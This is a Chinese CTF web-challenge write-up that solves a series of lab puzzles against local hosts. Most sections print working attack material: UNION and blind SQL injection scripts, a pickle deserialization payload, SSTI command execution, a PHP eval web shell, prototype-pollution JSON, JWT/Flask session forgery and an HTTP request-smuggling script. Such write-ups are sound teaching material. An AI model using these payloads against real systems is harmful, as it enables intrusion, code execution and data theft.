## 查分系统
直接看源码

## 归途
<img width="600" height="400" alt="image" src="https://github.com/user-attachments/assets/c52b997c-9435-4677-8723-1cbcdda6da39" />


key1：F12打开控制台会出现

key2：ctrl+u查看源码得到

key3：源码中会看到一个/getKey?id=3

<img width="600" alt="image" src="https://github.com/user-attachments/assets/4f232545-d5e9-4e5b-aa38-b08096ad0b60" />

key4：把id改成4，并且查看响应头也看到了key5，还提示发送POST请求可以获得key6

<img width="600" alt="image" src="https://github.com/user-attachments/assets/7619f6df-56a7-49e4-a416-53496e544cbc" />

<img width="600" height="333" alt="image" src="https://github.com/user-attachments/assets/c4ccc938-3186-467c-b14d-4060349abab8" />

<img width="600" height="221" alt="image" src="https://github.com/user-attachments/assets/9cea807c-7f3e-40b6-afe0-c8b0d6be3235" />

key7：访问login,先用游客登录再把cookie里面的user改成admin得到key7

<img width="600"  alt="image" src="https://github.com/user-attachments/assets/24afaf2e-c904-4bdd-ac5c-2dcd9f11f429" />

提示爬虫，访问robots.txt发现/f13ggggg目录
最后把所有key组合提交即可获得flag

<img width="600"  alt="image" src="https://github.com/user-attachments/assets/f5c1bfc3-a608-465d-9333-d73b50159a65" />

## 当零来敲门
SSH连接发现可以输入python命令，根据题目说明，要在短时间内发送1-500
写个脚本:
```python
import requests
import time

URL = "http://127.0.0.1:8080/chat"
s = requests.Session()
start = time.time()
for i in range(1, 501):
    try:
        r = s.post(
            URL,
            json={"user": "challenger", "msg": i},
            timeout=3
        )
        if i % 50 == 0:
            print(f"已发送 {i}/500，耗时 {time.time()-start:.2f} 秒")
    except Exception as e:
        print(f"发送 {i} 失败：{e}")
        break
print("总耗时：", round(time.time()-start, 2), "秒")
```

拿到flag:

<img width="600"  alt="image" src="https://github.com/user-attachments/assets/28dbcc1f-310b-413d-a214-5475c0bd0196" />


## 查分系统_revenge
打开源码看到信息都被加密了

<img width="1917" height="985" alt="image" src="https://github.com/user-attachments/assets/f2befaee-fd97-4dd7-b6f5-c7763894e01f" />

根据题目提示，需要key,应该就是学号
参考查分系统的信息，进行爆破即可获得flag

## MoeCatchTheFrogs
拿到9只青蛙即可获得flag,通过一直点击调查可以获得8只

<img width="1858" height="852" alt="image" src="https://github.com/user-attachments/assets/8df685cb-f335-44dc-bdb7-2d01cb581e40" />

F12可以看到有个session；
eyJmcm9ncyI6WzAsMSwyLDMsNCw1LDYsN119.auwsfQ.HR-_T_E24aJsqjcpmqgZwgFk8I4

三段式：内容+时间戳+签名

解码是：{
  "frogs": [
    0,
    1,
    2,
    3,
    4,
    5,
    6,
    7
  ]
}

要把8加上去，因为密钥未知，需要爆破，这里使用flask-unsign工具，用字典爆破，然后拿到密钥为qwe123456，提交JWT即可拿到flag

## 古籍翻阅
有一千个路径，这题很可能是路径穿越，发现txt文件中有个路径/true_file

<img width="937" height="331" alt="image" src="https://github.com/user-attachments/assets/a8e2e0cc-36dd-4048-8aef-57d105ea060b" />

提示flag在根目录，直接../../flag即可：

<img width="1012" height="203" alt="image" src="https://github.com/user-attachments/assets/a475f3dc-b29a-459b-903a-d369ea221f94" />

## 河湖小盗
最简单的SQL注入：
1 union select 1,database(),3

1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = 'past_paper'

1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = 'flag_table' and table_schema = 'past_paper'

1 union select 1,group_concat(flag),3 from flag_table

## 熊出没
这里有提示使用gopher://协议，输入gopher://127.0.0.1:54321看到有个/secret-honey路径  
gopher://127.0.0.1:54321/secret-honey访问发现不行：  
<img width="696" height="160" alt="image" src="https://github.com/user-attachments/assets/e2a39497-bde5-4855-a41e-1d14e6591a44" />  
好像s被解析了，去了解了一下，gopher 协议中`/`后的第一个字符是类型位，剩下的才是请求内容，单斜杠会吞掉`s`，双斜杠把`/`当类型位，后面完整保留`secret-honey`  
所以用gopher://127.0.0.1:54321//secret-honey才能得到flag

## 七狗免费小说
<img width="792" height="310" alt="image" src="https://github.com/user-attachments/assets/ea757b46-5e79-4e03-9102-abb5370ec399" />  
打开源码，发现<span style="color: #DD0000">'/http|https|env|\.\.|^\/|=\/|index|proc|input|data|convert|string|file/i'</span>  
很多协议被过滤了，还有个zlib.deflate没搬  
php://filter/read=zlib.deflate/resource=flag.php  
拿到flag:  
<img width="867" height="322" alt="image" src="https://github.com/user-attachments/assets/f728599e-672a-4772-99ad-75e53a49a2a8" />

## 合乎周礼
访问/api/flag   
<img width="730" height="222" alt="image" src="https://github.com/user-attachments/assets/1e70b2df-deff-4947-9e7a-2e1eea3c2c84" />  
显示缺少两个继承属性，所以为js原型污染链  
抓包看到身份为guest  
<img width="905" height="647" alt="image" src="https://github.com/user-attachments/assets/f9341768-9c70-42d1-bfd4-fc3123b7bb0a" />  
"isAdmin": null,
"canReadFlag": null  
去/api/profile里进行污染{
  "__proto__": {
    "isAdmin": true,
    "canReadFlag": true
  }
}，这里要加个Content-Type:application/json  
<img width="936" height="671" alt="image" src="https://github.com/user-attachments/assets/f47b7ce4-2ef7-4223-be38-4181cf9ea089" />  
发现污染成功了，访问/flag得到flag  
<img width="967" height="695" alt="image" src="https://github.com/user-attachments/assets/b8bfa265-b780-4328-ad81-0b70cb566dc1" />

## 我爱发明
一二关直接手动过  
<img width="1820" height="961" alt="image" src="https://github.com/user-attachments/assets/5a2a8136-e38f-47b7-8311-baf0bccfeda3" />  
第三关  
<img width="1492" height="962" alt="image" src="https://github.com/user-attachments/assets/9748fd9e-4b37-43bd-bf6d-6f186e328c94" />  
进入发现有大量档案，手动输入肯定不行，需要写脚本。  
这里点进列表看到网站结构http://127.0.0.1:25796/archive?page=1  
写个脚本  
```python
import concurrent.futures
import hashlib
import re
import sys
import time

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:25796"
WORKERS = 12


def get_page(session, url):
    response = session.get(url, timeout=8)
    response.raise_for_status()
    return response.content.decode("utf-8")


def main():
    session = requests.Session()
    session.get(f"{BASE}/stage/1", timeout=8).raise_for_status()
    stage1 = session.post(f"{BASE}/api/stage1", json={"parts": "B-17 S-09 T-04"}, timeout=8)
    stage1.raise_for_status()
    session.get(f"{BASE}/stage/2", timeout=8).raise_for_status()
    stage2 = session.post(f"{BASE}/api/stage2", json={"tuning": "860/73/III/2.4"}, timeout=8)
    stage2.raise_for_status()

    started = time.monotonic()
    page = get_page(session, f"{BASE}/stage/3")
    if "data-mechanical-ms" not in page:
        raise RuntimeError("未进入第三关，检查目标地址")

    with concurrent.futures.ThreadPoolExecutor(max_workers=24) as pool:
        pages = list(pool.map(lambda n: get_page(session, f"{BASE}/archive?page={n}"), range(1, 25)))

    ids = sorted({int(value) for page in pages for value in re.findall(
        r'<a class="invent-link"[^>]*href="/invent/(\d+)"[^>]*data-team="机械组"', page
    )})
    if not ids:
        raise RuntimeError("列表页没有解析到机械组档案")

    def inspect(record_id):
        html = get_page(session, f"{BASE}/invent/{record_id}")
        status = re.search(r'data-team="机械组" data-status="([^"]+)"', html)
        if not status or status.group(1) != "通过":
            return None
        fragment = re.search(r'<code class="inspection-code" data-code="([^"]+)"', html)
        if not fragment:
            return None
        return record_id, fragment.group(1)

    with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as pool:
        approved = [item for item in pool.map(inspect, ids) if item]
    approved.sort()
    if not approved:
        raise RuntimeError("没有找到盖章通过的机械组档案")

    joined = "|".join(fragment for _, fragment in approved)
    answer = hashlib.sha256(joined.encode("utf-8")).hexdigest()
    result = session.post(f"{BASE}/api/finalize", json={"answer": answer}, timeout=8)
    print(f"扫描机械组档案: {len(ids)} 份；通过: {len(approved)} 份")
    print(f"提交用时: {time.monotonic() - started:.2f}s")
    print(f"SHA256: {answer}")
    print(f"响应 HTTP {result.status_code}: {result.text}")
    result.raise_for_status()
    try:
        body = result.json()
    except ValueError:
        return
    if body.get("flag"):
        print(f"FLAG: {body['flag']}")
    elif body.get("error"):
        raise RuntimeError(body["error"])


if __name__ == "__main__":
    main()
```

## 日志系统
<img width="600"  alt="image" src="https://github.com/user-attachments/assets/7201ad74-9c64-4a48-824d-1e3606b40b70" />  

发现可以导出日志，pkl后缀，审计源码app.py  
考察python pickle反序列化，构造恶意序列化字符串，上传后即可获取flag  
```python
import pickle, requests
from urllib.parse import unquote

class P:
    def __reduce__(self):
        return eval, ("__import__('os').environ['FLAG']",)

r = requests.post(
    "http://127.0.0.1:48199/import",
    files={"file": ("x.pkl", pickle.dumps(P()))},
    allow_redirects=False,
)
print(unquote(r.headers["Location"]))
```

## 江洋大盗
输入1 and 1=1查询到了，1 and 1=2报错，判断是布尔盲注，黑名单禁用了union等关键词和字符  
用AI写了个脚本  
```python
import re
import threading
from concurrent.futures import ThreadPoolExecutor

import requests

URL = "http://127.0.0.1:29467/"
WORKERS = 8
MAX_LENGTH = 512

local = threading.local()


def oracle(condition):
    if not hasattr(local, "session"):
        local.session = requests.Session()

    response = local.session.post(
        URL,
        data={"id": f"1 AND ({condition})"},
        timeout=15,
    )
    response.raise_for_status()
    return b"result-table" in response.content


def extract(expr):
    lo, hi = 0, 1
    while hi <= MAX_LENGTH and not oracle(f"length({expr})<={hi}"):
        hi *= 2
    if hi > MAX_LENGTH:
        raise RuntimeError(f"长度超过限制：{expr}")

    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"length({expr})<={mid}"):
            hi = mid
        else:
            lo = mid + 1

    length = lo

    def get_char(pos):
        lo, hi = 0, 127
        while lo < hi:
            mid = (lo + hi) // 2
            if oracle(f"ascii(substring({expr},{pos},1))<={mid}"):
                hi = mid
            else:
                lo = mid + 1
        return pos, chr(lo)

    result = [""] * length
    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        for pos, char in pool.map(get_char, range(1, length + 1)):
            result[pos - 1] = char

    return "".join(result)


def sql_string(value):
    return "'" + value.replace("\\", "\\\\").replace("'", "''") + "'"


def sql_ident(value):
    return "`" + value.replace("`", "``") + "`"


def main():
    database = extract("database()")
    print(f"[+] 当前数据库：{database}")

    tables_expr = (
        "(select group_concat(table_name) "
        "from information_schema.tables "
        "where table_schema=database())"
    )
    tables = extract(tables_expr).split(",")
    print(f"[+] 数据表：{', '.join(tables)}")

    candidates = []
    for table in tables:
        columns_expr = (
            "(select group_concat(column_name) "
            "from information_schema.columns "
            f"where table_schema=database() and table_name={sql_string(table)})"
        )
        columns = extract(columns_expr).split(",")
        print(f"[+] {table} 列：{', '.join(columns)}")

        for column in columns:
            if re.search(r"flag|secret|token", column, re.I):
                candidates.insert(
                    0, (table, column)
                )
            else:
                candidates.append((table, column))

    seen = set()
    for table, column in candidates:
        if (table, column) in seen:
            continue
        seen.add((table, column))

        expr = (
            f"(select group_concat(cast({sql_ident(column)} as char)) "
            f"from {sql_ident(database)}.{sql_ident(table)})"
        )
        try:
            value = extract(expr)
        except RuntimeError:
            continue

        match = re.search(r"[A-Za-z0-9_]*\{[^{}]+\}", value)
        if match:
            print(f"[+] Flag：{match.group(0)}")
            return

    print("[-] 没找到符合常见格式的 flag；请检查上面输出的表和列。")


if __name__ == "__main__":
    main()
```

## 礼崩乐坏
和**合乎周礼**一样，原型污染链，但是proto被过滤了，考虑使用constructor.prototype扁平字符串绕过，效果是一样的  
```python
{
  "constructor.prototype.isAdmin": true,
  "constructor.prototype.canReadFlag": true
}

```  
<img width="968" height="675" alt="image" src="https://github.com/user-attachments/assets/4dd468c0-a4cd-4df6-b03c-4ad073d7f6f3" />  
污染成功，拿到flag

## bblogin
分析app.py,发现是SSTI,注入点是用户名，并且限制了长度，输入{{config}}查看配置信息,发现了SECRET_KEY,应该是伪造session  
<img width="1798" height="846" alt="image" src="https://github.com/user-attachments/assets/b22591bb-c0c4-477e-b14d-c05a8b380790" />  
用flask伪造session拿到session=eyJ0b2tlbiI6ImFkbWluIn0.au8WzQ.wpuVdetHBgbtDtHH2Ct0tOHyF9E  
然后传入cookie访问/user拿到flag  
<img width="1101" height="396" alt="image" src="https://github.com/user-attachments/assets/02b2ce62-a770-4bc1-becb-f29eea72a8d3" />

## 我刚一提交就发现了三个问题
文件上传，正常上传访问，文件已经被删除了，根据提示，是条件竞争，需要不断发包上传恶意文件  
写个马：<?=eval($_REQUEST['cmd']);?>  
这里抓包发送到Intruder进行持续请求，在这期间使用蚁剑连接  
<img width="1917" height="1026" alt="image" src="https://github.com/user-attachments/assets/0628067f-e2c1-4884-aa63-f8fb60ca7273" />  
添加成功，拿到flag  
<img width="570" height="203" alt="image" src="https://github.com/user-attachments/assets/5f2ee19f-16e4-4541-bdb9-193cb9b75eaf" />

## 旧能源管理系统
给了源码app.py,是无回显SSTI，username为注入点，这里使用重定向来回显  
```python
{{ cycler.__init__.__globals__.__builtins__.__import__('os').popen('env > static/env.txt').read() }}
```
再访问/static/env.txt，就能看到flag在环境变量里面

## 黑市走私
先访问/hint查看提示，给了**入场券**和**暗语**，是JWT伪造，然后密钥应该是暗语中的一个,对密钥爆破，得到fish为正确密钥  
拿到伪造JWT  
```python
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJhZG1pbiIsInNjb3BlIjoiZmxhZ3MifQ.EQmuoZNLf5aUF-WJ1MdjUFZJgPilOkgJRjXawdvIooI
```  

```python
交易暗号：先让柜台只看货箱长度，再让后仓按分块清点。 目标货物：/flag1
记得带上能证明你是高级买家的票据。
```
这里考察HTTP走私，利用前端和后端对 HTTP 请求结束边界解析不一致，TCP 长连接里多出的字节被后端当成下一条请求，实现走私，这里还需要去了解一下CL和TE  
类似于  
```python
POST /stage1 HTTP/1.1
Host: 127.0.0.1:47511
Content-Length: 
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /flag1 HTTP/1.1
Host: 127.0.0.1:47511
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJhZG1pbiIsInNjb3BlIjoiZmxhZ3MifQ.EQmuoZNLf5aUF-WJ1MdjUFZJgPilOkgJRjXawdvIooI
Connection: keep-alive
```
但是这里CL手动搓出错了做不出来，看了别的大佬的wp，用AI写了个脚本  
```python
import re
import socket
import time

HOST = "127.0.0.1"
PORT = 47511
JWT = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJhZG1pbiIsInNjb3BlIjoiZmxhZ3MifQ."
    "EQmuoZNLf5aUF-WJ1MdjUFZJgPilOkgJRjXawdvIooI"
)


def get_flag(entry, target, transfer_encoding):
    inner = (
        f"GET {target} HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Authorization: Bearer {JWT}\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
    )

    body = "0\r\n\r\n" + inner

    request = (
        f"POST {entry} HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Content-Length: {len(body.encode())}\r\n"
        f"{transfer_encoding}\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        + body
    ).encode()

    flush = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()

    with socket.create_connection((HOST, PORT), timeout=8) as sock:
        sock.settimeout(2)
        sock.sendall(request)
        time.sleep(0.1)
        sock.sendall(flush)

        response = b""
        while True:
            try:
                chunk = sock.recv(65536)
            except socket.timeout:
                break

            if not chunk:
                break

            response += chunk

    match = re.search(rb"flag\d+:[^\r\n]*", response, re.I)
    return match.group().decode() if match else None


flag1 = get_flag(
    "/stage1",
    "/flag1",
    "Transfer-Encoding: chunked",
)

flag2 = get_flag(
    "/stage2",
    "/flag2",
    "Transfer-Encoding : chunked",
)

print(flag1)
print(flag2)
```

## 七狗收费小说

## 巧乐兹
## 千度网盘
## moe论坛
